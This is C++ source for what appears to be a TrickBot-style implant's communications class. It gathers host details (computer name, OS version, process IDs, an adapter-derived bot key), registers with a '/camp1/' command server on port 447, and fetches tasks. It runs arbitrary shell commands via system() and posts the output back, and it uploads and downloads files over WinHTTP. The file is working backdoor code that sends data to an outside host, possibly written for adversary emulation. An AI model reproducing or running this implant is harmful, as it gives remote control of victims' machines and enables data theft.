#include "TbComms.h"

TbComms::TbComms(void) {

}

TbComms::~TbComms(void) {

}
/*
 * getInterface:
 *      About:
 *          Gets the first interface adapter info from a clients interface list
 *      Result:
 *          Returns a PIP_ADAPTER_INFO object
 */
PIP_ADAPTER_INFO TbComms::getInterface() {
    PIP_ADAPTER_INFO pAdapterInfo;
    PIP_ADAPTER_INFO pAdapter = NULL;
    DWORD dwRetVal = 0;

    ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
    pAdapterInfo = (IP_ADAPTER_INFO*)MALLOC(sizeof(IP_ADAPTER_INFO));
    if (pAdapterInfo == NULL) {
        printf("Error allocating memory needed to call GetAdaptersinfo\n");
    }
    // Make an initial call to GetAdaptersInfo to get
    // the necessary size into the ulOutBufLen variable
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
        FREE(pAdapterInfo);
        pAdapterInfo = (IP_ADAPTER_INFO*)MALLOC(ulOutBufLen);
        if (pAdapterInfo == NULL) {
            printf("Error allocating memory needed to call GetAdaptersinfo\n");
        }
    }
    if ((dwRetVal = GetAdaptersInfo(pAdapterInfo, &ulOutBufLen)) == NO_ERROR) {
        pAdapter = pAdapterInfo;
        return pAdapter;
    }
    return NULL;
}

/*
 * getBotKey:
 *      About:
 *          Generates the botkey using windows crypto libs
 *          Credit:https://github.com/hasherezade/malware_analysis/blob/master/trickbot/make_bot_key.cpp
 *      Result:
 *          Returns int based on success status 0,1,-1
 */
int TbComms::genBotKey(BYTE* buffer, DWORD buffer_size, char bot_id[SHA256_ASCII_LEN]) {
    DWORD dwStatus = 0;
    BOOL bResult = FALSE;
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;

    BYTE rgbHash[SHA256LEN] = { 0 };
    DWORD cbHash = 0;

    wchar_t info[] = L"Microsoft Enhanced RSA and AES Cryptographic Provider";
    if (!CryptAcquireContextW(&hProv, NULL, info, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        dwStatus = GetLastError();
        CryptReleaseContext(hProv, 0);
        return dwStatus;
    }

    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        dwStatus = GetLastError();
        CryptReleaseContext(hProv, 0);
        return dwStatus;
    }

    if (!CryptHashData(hHash, buffer, buffer_size, 0)) {
        dwStatus = GetLastError();
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        return dwStatus;
    }
    cbHash = SHA256LEN;
    if (CryptGetHashParam(hHash, HP_HASHVAL, rgbHash, &cbHash, 0)) {
        for (DWORD i = 0; i < cbHash; i++) {
            snprintf(bot_id, SHA256_ASCII_LEN, "%02X", rgbHash[i]);
            bot_id += 2;
        }
    }
    else {
        dwStatus = GetLastError();
    }
    CryptReleaseContext(hProv, 0);
    return dwStatus;
}

/*
 * getBotKey:
 *      About:
 *          Gets the botkey by calling genBotKey function
 *      Result:
 *          Returns the botkey as a string
 */
string TbComms::getBotKey(PIP_ADAPTER_INFO pAdapterInfo) {
    char bot_id[TbComms::SHA256_ASCII_LEN] = { 0 };
    if ((genBotKey((BYTE*)&pAdapterInfo->AdapterName, 0x194, bot_id)) == NO_ERROR) {
        return bot_id;
    }
}

/*
 * getComputerName:
 *      About:
 *          Gets the hostname of the client
 *      Result:
 *          Returns the hostname as a string
 */
string TbComms::getComputerName() {
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
    LPWSTR name = new wchar_t[size];
    std::vector<char> info_pcName;
    GetComputerNameW(name, &size);
    return std::string(CW2A(name));
}

/*
 * genRandomString:
 *      About:
 *          Generates a random string of n length
 *      Result:
 *          Returns a random string of n length
 */
string TbComms::genRandomString(const int len) {
    string tmp_s = "";
    static const char alphanum[] =
        "0123456789"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz";

    srand((unsigned)time(NULL));
    tmp_s.reserve(len);

    for (int i = 0; i < len; ++i)
        tmp_s += alphanum[rand() % (sizeof(alphanum) - 1)];

    return tmp_s;
}

void TbComms::setGuid() {
    guid = genRandomString(16);
    guid = "TrickBot-Implant";
}

string TbComms::getGuid() {
    return guid;
}

/*
 * getOsVersion:
 *      About:
 *          Gets the clients operating system version
 *      Result:
 *          Returns a string of the os version
 */
string TbComms::getOsVersion() {
    DWORD dwVersion = 0;
    dwVersion = GetVersion();
    return std::to_string(dwVersion);
}

// string TbComms::getOsHighLevel() {
//   OSVERSIONINFOEX info;
//   ZeroMemory(&info, sizeof(OSVERSIONINFOEX));
//   info.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
//   GetVersionEx(&info);

//   SYSTEM_INFO si;
//   GetSystemInfo(&si);
//   string arch = "";
//   if((si.wProcessorArchitecture & PROCESSOR_ARCHITECTURE_IA64)||(si.wProcessorArchitecture & PROCESSOR_ARCHITECTURE_AMD64)==64)
//   {
//       arch = "x64";
//   }
//   else
//   {
//       arch = "x32";
//   }
//   return "Windows" + info.dwMajorVersion + arch;
// }

/*
 * getClientId():
 *      About:
 *          Builds client_id used for trickbot registration
 *      Result:
 *          Returns a string that asd formatted as per TrickBot CTI.
 *          Concats multiple system information get functions to create the client id
 */
string TbComms::getClientId() {
    return getComputerName() + "_W" + getOsVersion() + "." + genRandomString(32);
}

string TbComms::getCWD() {
    DWORD size = MAX_PATH + 1;
    LPWSTR fullpath = new wchar_t[size];
    int bytes = GetModuleFileName(NULL, fullpath, size);
    std::string path = std::string(CW2A(fullpath));
    std::size_t botDirPos = path.find_last_of("\\");
    std::string dir = path.substr(0, botDirPos);
    return(dir);
}

string TbComms::getPID() {
    DWORD process = 0;
    process = GetCurrentProcessId();
    return (std::to_string(process));
}

string TbComms::getPPID() {
    DWORD process = 0;
    DWORD ppid = 0;
    HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = { 0 };
    pe.dwSize = sizeof(PROCESSENTRY32);
    process = GetCurrentProcessId();

    if (Process32First(h, &pe)) {
        do {
            if (pe.th32ProcessID == process) {
                ppid = pe.th32ParentProcessID;
            }
        } while (Process32Next(h, &pe));
    }
    CloseHandle(h);
    return (std::to_string(ppid));
}

/*
 * genRegistrationRequest():
 *      About:
 *          Generates the URI that is used to register with the TrickBot Server
 *      Result:
 *          Returns a string that is formatted as a URI
 *          Concats multiple system information get functions to create the registration URI
 *      Example:
 *          192.168.0.4:447/camp1/DMIN_W617601.HATGSF1265TRQIKSH54367FSGDHUIA11/0/Windows7x64/1234/0.0.0.0/GAVHSGFD12345ATGSHBDSAFSGTAGSBHSGFSDATQ12345AGSFSGBDISHJKAGS2343/C:/1111/2222/HAGSTGST123
 */
string TbComms::genRegistrationRequest() {
    setGuid();
    return "/camp1/" + getClientId() + "/" + std::to_string(Commands::Register) + "/" + "windows" + "/" + "1234" + "/" + "0.0.0.0" + "/" + getBotKey(getInterface()) + "/" + getCWD() + "/" + getPID() + "/" + getPPID() + "/" + getGuid();
}

//curl {hostip}:447/camp1/DMIN_W617601.HATGSF1265TRQIKSH54367FSGDHUIA11/80/HAGSTGST123
string TbComms::genGetTaskRequest() {
    return "/camp1/" + getClientId() + "/" + std::to_string(Commands::GetTasks) + "/" + getGuid();
}

string TbComms::genPostCmdOutputRequest() {
    return "/camp1/" + getClientId() + "/" + std::to_string(Commands::LogCmdExec) + "/" + getGuid();
}

string TbComms::genDownloadFileRequest(string filename) {
    return "/camp1/" + getClientId() + "/" + std::to_string(Commands::Download) + "/" + filename + "/" + getGuid();
}

string TbComms::genUploadFileRequest(string filename) {
    return "/camp1/" + getClientId() + "/" + std::to_string(Commands::UploadFile) + "/" + filename + "/" + getGuid();
}

void TbComms::writeFile(string filename, LPSTR filedata) {
    std::ofstream ofs;
    ofs.open(filename, std::ofstream::out | std::ofstream::binary);
    ofs << filedata;
    ofs.close();
    //ofstream out(filename);
    //out.write(filedata, strlen(filedata));
    //out.close();
}
/*
 * sendGet():
 *      About:
 *          Sends get request using WinExec and curl
 *      Result:
 *          Returns 0 if winexec failed
 *      Example:
 *          curl http://192.168.0.4:447/camp1/dragon_W602931718.0iUYavZhCaJrfKXUc9DFZxooo4t5aQZC/0/windows/1234/0.0.0.0/9CD76C0730B980B292D7A835FE5F9D21525E459BF2C317579A75F33857175EAB/0iUYavZhCaJrfKXUc9"
 */
LPSTR TbComms::sendGet(string ip, string port, string data) {
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer;
    BOOL  bResults = FALSE;
    HINTERNET  hSession = NULL,
        hConnect = NULL,
        hRequest = NULL;
    std::wstring host = std::wstring(ip.begin(), ip.end());
    int portnum = std::stoi(port, nullptr, 0);
    std::wstring urlpath = std::wstring(data.begin(), data.end());

    // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(L"WinHTTP Example/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);

    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect(hSession, host.c_str(),
            portnum, 0);


    // Create an HTTP request handle.
    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"GET", urlpath.c_str(),
            NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            0);

    // Send a request.
    if (hRequest)
        bResults = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            WINHTTP_NO_REQUEST_DATA, 0,
            0, 0);

    // End the request.
    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);

    // Keep checking for data until there is nothing left.
    if (bResults)
    {
        do
        {
            // Check for available data.
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
                printf("Error %u in WinHttpQueryDataAvailable.\n",
                    GetLastError());

            // Allocate space for the buffer.
            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                printf("Out of memory\n");
                dwSize = 0;
            }
            else
            {
                // Read the data.
                ZeroMemory(pszOutBuffer, dwSize + 1);

                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
                    dwSize, &dwDownloaded))
                    printf("Error %u in WinHttpReadData.\n", GetLastError());
                else

                    return(pszOutBuffer);
                // Free the memory allocated to the buffer.
            }
        } while (dwSize > 0);
    }
    // Report any errors.
    if (!bResults)
        printf("Error %d has occurred.\n", GetLastError());

    // Close any open handles.
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
    // delete [] pszOutBuffer;
    return(pszOutBuffer);
}

void TbComms::sendGetFile(string ip, string port, string data, string filename) {
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer;
    BOOL  bResults = FALSE;
    HINTERNET  hSession = NULL,
        hConnect = NULL,
        hRequest = NULL;
    FILE* pFile; // NEW
    pFile = fopen(filename.c_str(), "wb");
    std::wstring host = std::wstring(ip.begin(), ip.end());
    int portnum = std::stoi(port, nullptr, 0);
    std::wstring urlpath = std::wstring(data.begin(), data.end());

    DWORD dwStatusCode = 0;
    DWORD dwStatusSize = sizeof(dwStatusCode);
    LPVOID lpOutBuffer = NULL;

    // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(L"WinHTTP Example/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);

    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect(hSession, host.c_str(),
            portnum, 0);


    // Create an HTTP request handle.
    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"GET", urlpath.c_str(),
            NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            0);

    // Send a request.
    if (hRequest) {
        bResults = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            WINHTTP_NO_REQUEST_DATA, 0,
            0, 0);


    }
    // End the request.
    if (bResults) {
        bResults = WinHttpReceiveResponse(hRequest, NULL);
    }


    if (bResults) {
        WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_RAW_HEADERS_CRLF, WINHTTP_HEADER_NAME_BY_INDEX, NULL, &dwStatusSize, WINHTTP_NO_HEADER_INDEX);
        if (GetLastError() == ERROR_INSUFFICIENT_BUFFER)
        {
            lpOutBuffer = new WCHAR[dwStatusSize / sizeof(WCHAR)];

            // Now, use WinHttpQueryHeaders to retrieve the header.
            bResults = WinHttpQueryHeaders(hRequest,
                WINHTTP_QUERY_RAW_HEADERS_CRLF,
                WINHTTP_HEADER_NAME_BY_INDEX,
                lpOutBuffer, &dwStatusSize,
                WINHTTP_NO_HEADER_INDEX);
        }
    }
    if (bResults)
        printf("Header contents: \n%S", lpOutBuffer);

    // Keep checking for data until there is nothing left.
    if (bResults)
    {
        do
        {


            // Check for available data.
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
                printf("Error %u in WinHttpQueryDataAvailable.\n",
                    GetLastError());

            // Allocate space for the buffer.
            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                printf("Out of memory\n");
                dwSize = 0;
            }
            else
            {
                // Read the data.
                ZeroMemory(pszOutBuffer, dwSize + 1);

                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded)) {
                    printf("Error %u in WinHttpReadData.\n", GetLastError());
                }
                else {
                    fwrite(pszOutBuffer, (size_t)dwDownloaded, (size_t)1, pFile);
                }

                //return(pszOutBuffer);
                // Free the memory allocated to the buffer.
            }
            delete[] pszOutBuffer;
        } while (dwSize > 0);
        fclose(pFile);
    }
    // Report any errors.
    if (!bResults)
        printf("Error %d has occurred.\n", GetLastError());

    // Close any open handles.
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
    // delete [] pszOutBuffer;
    //return(pszOutBuffer);
}

std::string TbComms::executeCommand(string command) {
    if (command.rfind("cd", 0) == 0) {
        std::string path = command.substr(3, command.length());
        std::wstring data = std::wstring(path.begin(), path.end());
        if (!SetCurrentDirectory(data.c_str())) {
            return "Unable to cd\n";
        }
        else {
            return "Succsefully executed: " + command;
        }
    }
    else {
        system((command + " > temp.txt").c_str());
        std::ifstream ifs("temp.txt");
        std::string ret{ std::istreambuf_iterator<char>(ifs), std::istreambuf_iterator<char>() };
        ifs.close();
        if (std::remove("temp.txt") != 0) {
            perror("Error deleting temporary file");
        }
        return ret;
    }
}

LPSTR TbComms::sendPost(string ip, string port, string endpoint, string input, bool is_file) {
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer;
    BOOL  bResults = FALSE;
    HINTERNET  hSession = NULL,
        hConnect = NULL,
        hRequest = NULL;
    LPSTR data;
    std::string content;

    std::wstring host = std::wstring(ip.begin(), ip.end());
    int portnum = std::stoi(port, nullptr, 0);
    std::wstring urlpath = std::wstring(endpoint.begin(), endpoint.end());
    
    if (is_file) {
        std::ifstream ifs(input);
        
        content.assign((std::istreambuf_iterator<char>(ifs)),
            (std::istreambuf_iterator<char>()));
       data = const_cast<char*>(content.c_str());
    }
    else {
        data = const_cast<char*>(input.c_str());
    }

    DWORD datalen = strlen(data);

    // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(L"WinHTTP Example/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);

    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect(hSession, host.c_str(),
            portnum, 0);


    // Create an HTTP request handle.
    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"POST", urlpath.c_str(),
            NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            0);

    // Send a request.
    LPCWSTR additionalHeaders = L"Content-Type: application/x-www-form-urlencoded\r\n";
    DWORD headersLength = -1;
    if (hRequest)
        bResults = WinHttpSendRequest(hRequest,
            additionalHeaders, headersLength,
            LPVOID(data), datalen,
            datalen, 0);

    // End the request.
    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);

    // Keep checking for data until there is nothing left.
    if (bResults)
    {
        do
        {
            // Check for available data.
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
                printf("Error %u in WinHttpQueryDataAvailable.\n",
                    GetLastError());

            // Allocate space for the buffer.
            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                printf("Out of memory\n");
                dwSize = 0;
            }
            else
            {
                // Read the data.
                ZeroMemory(pszOutBuffer, dwSize + 1);

                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
                    dwSize, &dwDownloaded))
                    printf("Error %u in WinHttpReadData.\n", GetLastError());
                else
                    return(pszOutBuffer);
                // Free the memory allocated to the buffer.
            }
        } while (dwSize > 0);
    }
    // Report any errors.
    if (!bResults)
        printf("Error %d has occurred.\n", GetLastError());

    // Close any open handles.
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
    // delete [] pszOutBuffer;
    return(pszOutBuffer);
}

